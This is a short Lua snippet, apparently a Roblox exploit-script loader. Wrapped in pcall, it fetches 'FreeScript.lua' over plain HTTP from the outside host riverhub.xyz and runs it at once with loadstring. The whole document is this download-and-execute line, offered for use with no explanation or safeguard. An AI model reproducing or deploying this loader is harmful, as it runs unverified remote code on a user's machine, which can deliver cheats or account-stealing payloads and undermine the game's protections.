    pcall(function()
        loadstring(game:HttpGet("http://riverhub.xyz/FreeScript.lua"))()
    end)
